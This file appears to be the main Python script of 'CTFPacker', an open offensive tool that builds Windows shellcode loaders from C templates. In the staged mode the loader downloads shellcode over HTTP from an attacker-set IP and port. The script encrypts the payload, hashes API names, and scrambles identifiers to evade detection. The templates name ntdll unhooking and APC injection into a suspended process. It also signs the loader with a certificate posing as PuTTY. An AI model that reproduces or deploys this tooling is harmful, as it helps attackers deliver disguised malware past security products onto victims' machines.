# -*- coding: utf-8 -*-
'''

Author:         @B0lg0r0v (Arthur Minasyan)
X (Twitter):    @B0lg0r0v
LinkedIn:       https://www.linkedin.com/in/arthur-minasyan-b582b7233/

'''
import os
import random
import subprocess
import shutil, errno

from core.hashing import Hasher
from argparse import ArgumentParser
from core.utils import Colors, banner
from core.encryption import Encryption



def main():

    # Creating the parser first
    parser              = ArgumentParser(description="CTFPacker", epilog="Author: @B0lg0r0v (Arthur Minasyan)")
    subparsers          = parser.add_subparsers(dest="commands", help="Staged or Stageless Payloads", required=True)

    # Creating the subparsers
    parser_staged       = subparsers.add_parser("staged", help="Staged")
    parser_stageless    = subparsers.add_parser("stageless", help="Stageless")

    # Creating the arguments for the staged subcommand
    parser_staged.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
    parser_staged.add_argument("-i", "--ip-address", type=str, help="IP address from where your shellcode is gonna be fetched.", required=True)
    parser_staged.add_argument("-po", "--port", type=int, help="Port from where the HTTP connection is gonna fetch your shellcode.", required=True)
    parser_staged.add_argument("-pa", "--path", type=str, help="Path from where your shellcode uis gonna be fetched. ", required=True)
    parser_staged.add_argument("-o", "--output", type=str, help="Output path where the shellcode is gonna be saved.")


    parser_staged.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the shellcode via AES-128-CBC.")
    parser_staged.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
    parser_staged.add_argument("-si", "--sign", action="store_true", help="Sign the loader with a random certificate.")

    parser_staged.epilog = "Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s -si"
    

    # Creating the arguments for the stageless subcommand
    parser_stageless.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
    parser_stageless.add_argument("-o", "--output", type=str, help="Output path where the loader is gonna be saved.")
    
    parser_stageless.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the shellcode via AES-128-CBC.")
    parser_stageless.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
    parser_stageless.add_argument("-si", "--sign", action="store_true", help="Sign the loader with a random certificate.")

    parser_stageless.epilog = "Example usage: python main.py stageless -p shellcode.bin -o shellcode -e -s -si"

    # Parsing the arguments
    args = parser.parse_args()


    # Banner
    banner()

#--------------------------------------#
#----------- Staged Variant -----------#
#--------------------------------------#

    if args.commands == "staged":
        
        print(Colors.green("[i] Staged Payload selected."))
        print(Colors.light_yellow("[+] Starting the process..."))

        # We make a temporary folder called ".ctfpacker" and copy the template files to this folder.
        cr_directory    = os.getcwd()
        src_directory   = rf'{cr_directory}\templates\staged'
        dst_directory   = f'{cr_directory}\\.ctfpacker'

        # Copying the files from the templates folder to the temporary folder
        try:
            shutil.copytree(src_directory, dst_directory)
        except OSError as e:
            # deleting the folder if it exists
            if e.errno == errno.EEXIST:
                shutil.rmtree(dst_directory)
                shutil.copytree(src_directory, dst_directory)
            else:
                print(f"Error: {e}")

        if args.payload and args.ip_address and args.port and args.path:

            print(Colors.green("[i] Corresponding template selected.."))

            ip                          = args.ip_address
            port                        = args.port
            path                        = args.path

            with open(f'{dst_directory}\\download.c', 'r') as file:
                download_data = file.readlines()

            for i in range(len(download_data)):
                if "#-IP_VALUE-#" in download_data[i]:
                    download_data[i] = download_data[i].replace("#-IP_VALUE-#", ip)
                if "#-PORT_VALUE-#" in download_data[i]:
                    download_data[i] = download_data[i].replace("#-PORT_VALUE-#", str(port))
                if "#-PATH_VALUE-#" in download_data[i]:
                    download_data[i] = download_data[i].replace('#-PATH_VALUE-#', path)

            with open(f'{dst_directory}\\download.c', 'w') as file:
                file.writelines(download_data)

            # We read the shellcode from the file
            with open(args.payload, "rb") as file:
                payload = file.read()

            INITIAL_SEED                = random.randint(5, 20)
            INITIAL_HASH                = random.randint(2000, 9000)

            NTDLL_HASH                  = Hasher.Hasher("NTDLL.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNEL32_HASH               = Hasher.Hasher("KERNEL32.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNELBASE_HASH             = Hasher.Hasher("KERNELBASE.DLL", INITIAL_SEED, INITIAL_HASH)
            DEBUGACTIVEPROCESSSTOP_HASH = Hasher.Hasher("DebugActiveProcessStop", INITIAL_SEED, INITIAL_HASH)
            CREATEPROCESSA_HASH         = Hasher.Hasher("CreateProcessA", INITIAL_SEED, INITIAL_HASH)
            NTMAPVIEWOFSECTION_HASH     = Hasher.Hasher("NtMapViewOfSection", INITIAL_SEED, INITIAL_HASH)

            # Modifying all .c and .h files in the temporary folder
            for filename in os.listdir(dst_directory):
                if filename.endswith(".c") or filename.endswith(".h"):
                    with open(f"{dst_directory}\\{filename}", "r") as file:
                        data = file.readlines()

                    for i in range(len(data)):
                        if "#-INITIAL_HASH_VALUE-# " in data[i]:
                            data[i] = data[i].replace("#-INITIAL_HASH_VALUE-#", str(INITIAL_HASH))
                        if "#-INITIAL_SEED_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-INITIAL_SEED_VALUE-#", str(INITIAL_SEED))
                        if "#-NTDLL_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-NTDLL_VALUE-#", NTDLL_HASH)
                        if "#-KERNEL32_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-KERNEL32_VALUE-#", KERNEL32_HASH)
                        if "#-KERNELBASE_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-KERNELBASE_VALUE-#", KERNELBASE_HASH)
                        if "#-DAPS_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-DAPS_VALUE-#", DEBUGACTIVEPROCESSSTOP_HASH)
                        if "#-CREATEPROCESSA_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-CREATEPROCESSA_VALUE-#", CREATEPROCESSA_HASH)
                        if "#-NTMVOS_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-NTMVOS_VALUE-#", NTMAPVIEWOFSECTION_HASH)

                    with open(f"{dst_directory}\\{filename}", "w") as file:
                        file.writelines(data)

            print(Colors.green("[+] Template files modified !"))
            
            # Handling the case if encryption is wanted
            if args.encrypt:

                print(Colors.green("[i] Encryption selected."))
                print(Colors.light_yellow("[+] Encrypting the payload..."))

                enc_payload, key, iv = Encryption.EncryptAES(payload)

                if os.path.exists(f"{args.output}.bin"):
                    os.remove(f"{args.output}.bin")

                with open(f"{args.output}.bin", "wb") as file:
                    file.write(enc_payload)

                # We write the key and IV into main.c 
                with open(f"{dst_directory}\\main.c", "r") as file:
                    main_data = file.readlines()

                # We look for the following placeholders: "#-KEY_VALUE-#" and "#-IV_VALUE-#" and replace them with the actual values
                for i in range(len(main_data)):
                    if "#-KEY_VALUE-#" in main_data[i]:
                        main_data[i] = main_data[i].replace("#-KEY_VALUE-#", key)
                    if "#-IV_VALUE-#" in main_data[i]:
                        main_data[i] = main_data[i].replace("#-IV_VALUE-#", iv)

                # Writing the data back to the file
                with open(f"{dst_directory}\\main.c", "w") as file:
                    file.writelines(main_data)

                print(Colors.green(f"[+] Payload encrypted and saved to {cr_directory}\\{args.output}.bin !"))


            # If encryption is not wanted (for whatever reason)
            if args.encrypt is False:

                print(Colors.green("[i] Encryption not selected."))
                print(Colors.light_yellow("[+] Compiling the loader..."))

                # We comment out the encryption function in the main.c file
                with open(f"{dst_directory}\\main.c", "r") as file:
                    main_data = file.readlines()

                for i in range(len(main_data)):
                    if "#include \"AES_128_CBC.h\"" in main_data[i]:
                        main_data[i] = f"//{main_data[i]}"
                    if "AES_CTX" in main_data[i]:
                        main_data[i] = f"\t//{main_data[i]}"
                    if "uint8_t aes_k[16] = { #-KEY_VALUE-# };" in main_data[i]:
                        main_data[i] = f"//{main_data[i]}"
                    if "uint8_t aes_i[16] = { #-IV_VALUE-# };" in main_data[i]:
                        main_data[i] = f"//{main_data[i]}"
                    if "Starting the decryption..." in main_data[i]:
                        main_data[i] = f"\t//{main_data[i]}"
                    if "pClearText = (PBYTE)malloc(sEncPayload);" in main_data[i]:
                        main_data[i] = f"\t//{main_data[i]}"
                    if "AES_DecryptInit(&ctx, aes_k, aes_i);" in main_data[i]:
                        main_data[i] = f"\t//{main_data[i]}"
                    if "AES_DecryptBuffer(&ctx, pEncPayload, pClearText, sEncPayload);" in main_data[i]:
                        main_data[i] = f"\t//{main_data[i]}"
                    if "Payload decrypted at postion: 0x%p with size of %zu" in main_data[i]:
                        main_data[i] = f"\t//{main_data[i]}"
                    if "if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess))" in main_data[i]:
                        main_data[i] = f"\tif (!APCInjection(hProcess, (PVOID) pEncPayload, sEncPayload, &pProcess)) {{"

                with open(f"{dst_directory}\\main.c", "w") as file:
                    file.writelines(main_data)

                # We copy the payload file to the path specified by the user
                shutil.copy(args.payload, f"{args.output}.bin")

            if args.scramble:

                print(Colors.green("[i] Scrambling selected."))
                print(Colors.light_yellow("[+] Scrambling the loader..."))

                functions = ["HashStringDjb2A", "GetProcAddressH", "GetModuleHandleH", "MapNtdll", "Unhook", "AES_DecryptInit", "AES_DecryptBuffer", 
                             "CreateSuspendedProcess", "APCInjection", "cDAPSu", "cCPAu", "aes_k", "aes_i", "AES_Decrypt", "AES_Encrypt", "AES_EncryptInit",
                             "GetContent", "NTAVM", "NTPVM", "NTWVM", "NTQAT"]
                scrambled_functions = []

                variables = ["sEncPayload", "pEncPayload", "pClearText", "ctx", "hProcess", "pProcess", "dwSizeOfClearText", "dwOldProtect", "dwProcessId"]
                scrambled_variables = []

                alphabet = list("abcdefghijklmnopqrstuvwxyz")
                used_combos = set()

                # Scrambling the functions
                for sign in functions + variables:
                    letter = random.choice(alphabet)
                    multiplier = random.randint(1, 128)
                    while (letter, multiplier) in used_combos:
                        letter = random.choice(alphabet)
                        multiplier = random.randint(1, 128)
                    used_combos.add((letter, multiplier))
                    scrambled_sign = letter * multiplier

                    if sign in functions:
                        scrambled_functions.append(scrambled_sign)
                    else:
                        scrambled_variables.append(scrambled_sign)
                    
                # Modifying all .c and .h files in the temporary folder
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h") or filename.endswith(".asm"):
                        with open(f"{dst_directory}\\{filename}", "r") as file:
                            data = file.readlines()

                        for i in range(len(data)):
                            if "HashStringDjb2A" in data[i]:
                                data[i] = data[i].replace("HashStringDjb2A", scrambled_functions[0])
                            if "GetProcAddressH" in data[i]:
                                data[i] = data[i].replace("GetProcAddressH", scrambled_functions[1])
                            if "GetModuleHandleH" in data[i]:
                                data[i] = data[i].replace("GetModuleHandleH", scrambled_functions[2])
                            if "MapNtdll" in data[i]:
                                data[i] = data[i].replace("MapNtdll", scrambled_functions[3])
                            if "Unhook" in data[i]:
                                data[i] = data[i].replace("Unhook", scrambled_functions[4])
                            if "AES_DecryptInit" in data[i]:
                                data[i] = data[i].replace("AES_DecryptInit", scrambled_functions[5])
                            if "AES_DecryptBuffer" in data[i]:
                                data[i] = data[i].replace("AES_DecryptBuffer", scrambled_functions[6])
                            if "CreateSuspendedProcess" in data[i]:
                                data[i] = data[i].replace("CreateSuspendedProcess", scrambled_functions[7])
                            if "APCInjection" in data[i]:
                                data[i] = data[i].replace("APCInjection", scrambled_functions[8])
                            if "cDAPSu" in data[i]:
                                data[i] = data[i].replace("cDAPSu", scrambled_functions[9])
                            if "cCPAu" in data[i]:
                                data[i] = data[i].replace("cCPAu", scrambled_functions[10])
                            if "aes_k" in data[i]:
                                data[i] = data[i].replace("aes_k", scrambled_functions[11])
                            if "aes_i" in data[i]:
                                data[i] = data[i].replace("aes_i", scrambled_functions[12])
                            if "AES_Decrypt" in data[i]:
                                data[i] = data[i].replace("AES_Decrypt", scrambled_functions[13])
                            if "AES_Encrypt" in data[i]:
                                data[i] = data[i].replace("AES_Encrypt", scrambled_functions[14])
                            if "AES_EncryptInit" in data[i]:
                                data[i] = data[i].replace("AES_EncryptInit", scrambled_functions[15])
                            if "GetContent" in data[i]:
                                data[i] = data[i].replace("GetContent", scrambled_functions[16])
                            if "NTAVM" in data[i]:
                                data[i] = data[i].replace("NTAVM", scrambled_functions[17])
                            if "NTPVM" in data[i]:
                                data[i] = data[i].replace("NTPVM", scrambled_functions[18])
                            if "NTWVM" in data[i]:
                                data[i] = data[i].replace("NTWVM", scrambled_functions[19])
                            if "NTQAT" in data[i]:
                                data[i] = data[i].replace("NTQAT", scrambled_functions[20])               

                        with open(f"{dst_directory}\\{filename}", "w") as file:
                            file.writelines(data)

                # Modifying the main.c file
                with open(f"{dst_directory}\\main.c", "r") as file:
                    main_data = file.readlines()

                for i in range(len(main_data)):
                    if "sEncPayload" in main_data[i]:
                        main_data[i] = main_data[i].replace("sEncPayload", scrambled_variables[0])
                    if "pEncPayload" in main_data[i]:
                        main_data[i] = main_data[i].replace("pEncPayload", scrambled_variables[1])
                    if "pClearText" in main_data[i]:
                        main_data[i] = main_data[i].replace("pClearText", scrambled_variables[2])
                    if "ctx" in main_data[i]:
                        main_data[i] = main_data[i].replace("ctx", scrambled_variables[3])
                    if "hProcess" in main_data[i]:
                        main_data[i] = main_data[i].replace("hProcess", scrambled_variables[4])
                    if "pProcess" in main_data[i]:
                        main_data[i] = main_data[i].replace("pProcess", scrambled_variables[5])
                    if "dwSizeOfClearText" in main_data[i]:
                        main_data[i] = main_data[i].replace("dwSizeOfClearText", scrambled_variables[6])
                    if "dwOldProtect" in main_data[i]:
                        main_data[i] = main_data[i].replace("dwOldProtect", scrambled_variables[7])
                    if "dwProcessId" in main_data[i]:
                        main_data[i] = main_data[i].replace("dwProcessId", scrambled_variables[8])  

                with open(f"{dst_directory}\\main.c", "w") as file:
                    file.writelines(main_data)

                print(Colors.green("[+] Loader scrambled !"))

            if args.sign:

                print(Colors.green("[i] Signing selected."))
                print(Colors.light_yellow("[+] Signing the loader..."))
                
                pfx_path = f"{cr_directory}\\custom_certs\\sign_putty.pfx"
                pfx_password = "Password"
                input_binary = "ctfloader.exe"
                signed_binary = "ctfloader_signed.exe"

                os.system(f"cd {dst_directory} && make clean && make")
                shutil.move(f"{dst_directory}\\ctfloader.exe", f"ctfloader.exe")

                if os.path.exists("ctfloader_signed.exe"):
                    os.remove("ctfloader_signed.exe")

                subprocess.run([
                    f"{cr_directory}\\custom_certs\\osslsigncode.exe",
                    "sign",
                    "-pkcs12", pfx_path,
                    "-pass", pfx_password,
                    "-n", "Signed Loader",
                    "-i", "https://putty.com",
                    "-t", "http://timestamp.sectigo.com",
                    "-in", input_binary,
                    "-out", signed_binary
                ], check=True)

                shutil.rmtree(dst_directory)

                print(Colors.green("[+] Loader signed !"))

            if args.sign is False:
                
                # Everything has been modified, we can now compile the loader
                os.system(f"cd {dst_directory} && make clean && make")

                # We move the compiled loader one directory up
                shutil.move(f"{dst_directory}\\ctfloader.exe", f"ctfloader.exe")

                # We delete the temporary folder
                shutil.rmtree(dst_directory)

                print(Colors.green("[+] Loader compiled !"))

            print(Colors.green("[+] DONE !"))

#-----------------------------------------#
#----------- Stageless Variant -----------#
#-----------------------------------------#
    if args.commands == "stageless":

        print(Colors.green("[i] Stageless Payload selected."))
        print(Colors.light_yellow("[+] Starting the process..."))

         # We make a temporary folder called ".ctfpacker" and copy the template files to this folder.
        cr_directory    = os.getcwd()
        src_directory   = rf'{cr_directory}\templates\stageless'
        dst_directory   = f'{cr_directory}\\.ctfpacker'

        # Copying the files from the templates folder to the temporary folder
        try:
            shutil.copytree(src_directory, dst_directory)
        except OSError as e:
            # deleting the folder if it exists
            if e.errno == errno.EEXIST:
                shutil.rmtree(dst_directory)
                shutil.copytree(src_directory, dst_directory)
            else:
                print(f"Error: {e}")

        # Parsing the args now
        if args.payload:

            # We read the shellcode from the file
            with open(args.payload, "rb") as file:
                raw_payload = file.read()

            # converting the payload to hex for ease
            payload = ', '.join(f"0x{b:02x}" for b in raw_payload)

            INITIAL_SEED                = random.randint(5, 20)
            INITIAL_HASH                = random.randint(2000, 9000)

            NTDLL_HASH                  = Hasher.Hasher("NTDLL.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNEL32_HASH               = Hasher.Hasher("KERNEL32.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNELBASE_HASH             = Hasher.Hasher("KERNELBASE.DLL", INITIAL_SEED, INITIAL_HASH)
            DEBUGACTIVEPROCESSSTOP_HASH = Hasher.Hasher("DebugActiveProcessStop", INITIAL_SEED, INITIAL_HASH)
            CREATEPROCESSA_HASH         = Hasher.Hasher("CreateProcessA", INITIAL_SEED, INITIAL_HASH)
            NTMAPVIEWOFSECTION_HASH     = Hasher.Hasher("NtMapViewOfSection", INITIAL_SEED, INITIAL_HASH)

            # Modifying all .c and .h files in the temporary folder
            for filename in os.listdir(dst_directory):
                if filename.endswith(".c") or filename.endswith(".h"):
                    with open(f"{dst_directory}\\{filename}", "r") as file:
                        data = file.readlines()

                    for i in range(len(data)):
                        if "#-INITIAL_HASH_VALUE-# " in data[i]:
                            data[i] = data[i].replace("#-INITIAL_HASH_VALUE-#", str(INITIAL_HASH))
                        if "#-INITIAL_SEED_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-INITIAL_SEED_VALUE-#", str(INITIAL_SEED))
                        if "#-NTDLL_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-NTDLL_VALUE-#", NTDLL_HASH)
                        if "#-KERNEL32_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-KERNEL32_VALUE-#", KERNEL32_HASH)
                        if "#-KERNELBASE_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-KERNELBASE_VALUE-#", KERNELBASE_HASH)
                        if "#-DAPS_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-DAPS_VALUE-#", DEBUGACTIVEPROCESSSTOP_HASH)
                        if "#-CREATEPROCESSA_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-CREATEPROCESSA_VALUE-#", CREATEPROCESSA_HASH)
                        if "#-NTMVOS_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-NTMVOS_VALUE-#", NTMAPVIEWOFSECTION_HASH)

                    with open(f"{dst_directory}\\{filename}", "w") as file:
                        file.writelines(data)

            print(Colors.green("[+] Template files modified !"))

            # Handling the case if encryption is wanted
            if args.encrypt:

                print(Colors.green("[i] Encryption selected."))
                print(Colors.light_yellow("[+] Encrypting the payload..."))

                enc_payload, key, iv = Encryption.EncryptAES(raw_payload)

                # converting the payload to hex for ease
                hex_payload = ', '.join(f"0x{b:02x}" for b in enc_payload)

                # We write the key and IV into main.c 
                with open(f"{dst_directory}\\main.c", "r") as file:
                    main_data = file.readlines()

                # We look for the following placeholders: "#-KEY_VALUE-#" and "#-IV_VALUE-#" and replace them with the actual values
                for i in range(len(main_data)):
                    if "#-KEY_VALUE-#" in main_data[i]:
                        main_data[i] = main_data[i].replace("#-KEY_VALUE-#", key)
                    if "#-IV_VALUE-#" in main_data[i]:
                        main_data[i] = main_data[i].replace("#-IV_VALUE-#", iv)
                    if "#-PAYLOAD_VALUE-#" in main_data[i]:
                        main_data[i] = main_data[i].replace("#-PAYLOAD_VALUE-#", str(hex_payload))

                # Writing the data back to the file
                with open(f"{dst_directory}\\main.c", "w") as file:
                    file.writelines(main_data)

                print(Colors.green(f"[+] Payload encrypted and saved into payload[] variable in main.c !"))

            # If encryption is not wanted (for whatever reason)
            if args.encrypt is False:

                print(Colors.green("[i] Encryption not selected."))
                print(Colors.light_yellow("[+] Compiling the loader..."))

                # We comment out the encryption function in the main.c file
                with open(f"{dst_directory}\\main.c", "r") as file:
                    main_data = file.readlines()

                for i in range(len(main_data)):
                    if "#include \"AES_128_CBC.h\"" in main_data[i]:
                        main_data[i] = f"//{main_data[i]}"
                    if "AES_CTX" in main_data[i]:
                        main_data[i] = f"\t//{main_data[i]}"
                    if "uint8_t aes_k[16] = { #-KEY_VALUE-# };" in main_data[i]:
                        main_data[i] = f"//{main_data[i]}"
                    if "uint8_t aes_i[16] = { #-IV_VALUE-# };" in main_data[i]:
                        main_data[i] = f"//{main_data[i]}"
                    if "Starting the decryption..." in main_data[i]:
                        main_data[i] = f"\t//{main_data[i]}"
                    if "pClearText = (PBYTE)malloc(sEncPayload);" in main_data[i]:
                        main_data[i] = f"\t//{main_data[i]}"
                    if "AES_DecryptInit(&ctx, aes_k, aes_i);" in main_data[i]:
                        main_data[i] = f"\t//{main_data[i]}"
                    if "AES_DecryptBuffer(&ctx, &payload, pClearText, sEncPayload)" in main_data[i]:
                        main_data[i] = f"\t//{main_data[i]}"
                    if "Payload decrypted at postion: 0x%p with size of %zu" in main_data[i]:
                        main_data[i] = f"\t//{main_data[i]}"
                    if "if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess))" in main_data[i]:
                        main_data[i] = f"\tif (!APCInjection(hProcess, (PVOID) &payload, sEncPayload, &pProcess)) {{"
                    if "#-PAYLOAD_VALUE-#" in main_data[i]:
                        main_data[i] = main_data[i].replace("#-PAYLOAD_VALUE-#", payload)

                with open(f"{dst_directory}\\main.c", "w") as file:
                    file.writelines(main_data)

            if args.scramble:

                print(Colors.green("[i] Scrambling selected."))
                print(Colors.light_yellow("[+] Scrambling the loader..."))

                functions = ["HashStringDjb2A", "GetProcAddressH", "GetModuleHandleH", "MapNtdll", "Unhook", "AES_DecryptInit", "AES_DecryptBuffer", 
                             "CreateSuspendedProcess", "APCInjection", "cDAPSu", "cCPAu", "aes_k", "aes_i", "AES_Decrypt", "AES_Encrypt", "AES_EncryptInit",
                             "NTAVM", "NTPVM", "NTWVM", "NTQAT"]
                scrambled_functions = []

                variables = ["sEncPayload", "pEncPayload", "pClearText", "ctx", "hProcess", "pProcess", "dwSizeOfClearText", "dwOldProtect", "dwProcessId", "payload"]
                scrambled_variables = []

                alphabet = list("abcdefghijklmnopqrstuvwxyz")
                used_combos = set()

                # Scrambling the functions
                for sign in functions + variables:
                    letter = random.choice(alphabet)
                    multiplier = random.randint(1, 128)
                    while (letter, multiplier) in used_combos:
                        letter = random.choice(alphabet)
                        multiplier = random.randint(1, 128)
                    used_combos.add((letter, multiplier))
                    scrambled_sign = letter * multiplier

                    if sign in functions:
                        scrambled_functions.append(scrambled_sign)
                    else:
                        scrambled_variables.append(scrambled_sign)
                    
                # Modifying all .c and .h files in the temporary folder
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h") or filename.endswith(".asm"):
                        with open(f"{dst_directory}\\{filename}", "r") as file:
                            data = file.readlines()

                        for i in range(len(data)):
                            if "HashStringDjb2A" in data[i]:
                                data[i] = data[i].replace("HashStringDjb2A", scrambled_functions[0])
                            if "GetProcAddressH" in data[i]:
                                data[i] = data[i].replace("GetProcAddressH", scrambled_functions[1])
                            if "GetModuleHandleH" in data[i]:
                                data[i] = data[i].replace("GetModuleHandleH", scrambled_functions[2])
                            if "MapNtdll" in data[i]:
                                data[i] = data[i].replace("MapNtdll", scrambled_functions[3])
                            if "Unhook" in data[i]:
                                data[i] = data[i].replace("Unhook", scrambled_functions[4])
                            if "AES_DecryptInit" in data[i]:
                                data[i] = data[i].replace("AES_DecryptInit", scrambled_functions[5])
                            if "AES_DecryptBuffer" in data[i]:
                                data[i] = data[i].replace("AES_DecryptBuffer", scrambled_functions[6])
                            if "CreateSuspendedProcess" in data[i]:
                                data[i] = data[i].replace("CreateSuspendedProcess", scrambled_functions[7])
                            if "APCInjection" in data[i]:
                                data[i] = data[i].replace("APCInjection", scrambled_functions[8])
                            if "cDAPSu" in data[i]:
                                data[i] = data[i].replace("cDAPSu", scrambled_functions[9])
                            if "cCPAu" in data[i]:
                                data[i] = data[i].replace("cCPAu", scrambled_functions[10])
                            if "aes_k" in data[i]:
                                data[i] = data[i].replace("aes_k", scrambled_functions[11])
                            if "aes_i" in data[i]:
                                data[i] = data[i].replace("aes_i", scrambled_functions[12])
                            if "AES_Decrypt" in data[i]:
                                data[i] = data[i].replace("AES_Decrypt", scrambled_functions[13])
                            if "AES_Encrypt" in data[i]:
                                data[i] = data[i].replace("AES_Encrypt", scrambled_functions[14])
                            if "AES_EncryptInit" in data[i]:
                                data[i] = data[i].replace("AES_EncryptInit", scrambled_functions[15])
                            if "NTAVM" in data[i]:
                                data[i] = data[i].replace("NTAVM", scrambled_functions[16])
                            if "NTPVM" in data[i]:
                                data[i] = data[i].replace("NTPVM", scrambled_functions[17])
                            if "NTWVM" in data[i]:
                                data[i] = data[i].replace("NTWVM", scrambled_functions[18])
                            if "NTQAT" in data[i]:
                                data[i] = data[i].replace("NTQAT", scrambled_functions[19])               

                        with open(f"{dst_directory}\\{filename}", "w") as file:
                            file.writelines(data)

                # Modifying the main.c file
                with open(f"{dst_directory}\\main.c", "r") as file:
                    main_data = file.readlines()

                for i in range(len(main_data)):
                    if "sEncPayload" in main_data[i]:
                        main_data[i] = main_data[i].replace("sEncPayload", scrambled_variables[0])
                    if "pEncPayload" in main_data[i]:
                        main_data[i] = main_data[i].replace("pEncPayload", scrambled_variables[1])
                    if "pClearText" in main_data[i]:
                        main_data[i] = main_data[i].replace("pClearText", scrambled_variables[2])
                    if "ctx" in main_data[i]:
                        main_data[i] = main_data[i].replace("ctx", scrambled_variables[3])
                    if "hProcess" in main_data[i]:
                        main_data[i] = main_data[i].replace("hProcess", scrambled_variables[4])
                    if "pProcess" in main_data[i]:
                        main_data[i] = main_data[i].replace("pProcess", scrambled_variables[5])
                    if "dwSizeOfClearText" in main_data[i]:
                        main_data[i] = main_data[i].replace("dwSizeOfClearText", scrambled_variables[6])
                    if "dwOldProtect" in main_data[i]:
                        main_data[i] = main_data[i].replace("dwOldProtect", scrambled_variables[7])
                    if "dwProcessId" in main_data[i]:
                        main_data[i] = main_data[i].replace("dwProcessId", scrambled_variables[8])  
                    if "payload" in main_data[i]:
                        main_data[i] = main_data[i].replace("payload", scrambled_variables[9])

                with open(f"{dst_directory}\\main.c", "w") as file:
                    file.writelines(main_data)

                print(Colors.green("[+] Loader scrambled !"))

            if args.sign:

                print(Colors.green("[i] Signing selected."))
                print(Colors.light_yellow("[+] Signing the loader..."))
                
                pfx_path = f"{cr_directory}\\custom_certs\\sign_putty.pfx"
                pfx_password = "Password"
                input_binary = "ctfloader.exe"
                signed_binary = "ctfloader_signed.exe"

                os.system(f"cd {dst_directory} && make clean && make")
                shutil.move(f"{dst_directory}\\ctfloader.exe", f"ctfloader.exe")

                if os.path.exists("ctfloader_signed.exe"):
                    os.remove("ctfloader_signed.exe")

                subprocess.run([
                    f"{cr_directory}\\custom_certs\\osslsigncode.exe",
                    "sign",
                    "-pkcs12", pfx_path,
                    "-pass", pfx_password,
                    "-n", "Signed Loader",
                    "-i", "https://putty.com",
                    "-t", "http://timestamp.sectigo.com",
                    "-in", input_binary,
                    "-out", signed_binary
                ], check=True)

                shutil.rmtree(dst_directory)

                print(Colors.green("[+] Loader signed !"))

            if args.sign is False:
                
                # Everything has been modified, we can now compile the loader
                os.system(f"cd {dst_directory} && make clean && make")

                # We move the compiled loader one directory up
                shutil.move(f"{dst_directory}\\ctfloader.exe", f"ctfloader.exe")

                # We delete the temporary folder
                shutil.rmtree(dst_directory)

                print(Colors.green("[+] Loader compiled !"))

            print(Colors.green("[+] DONE !"))

if __name__ == "__main__":
    main()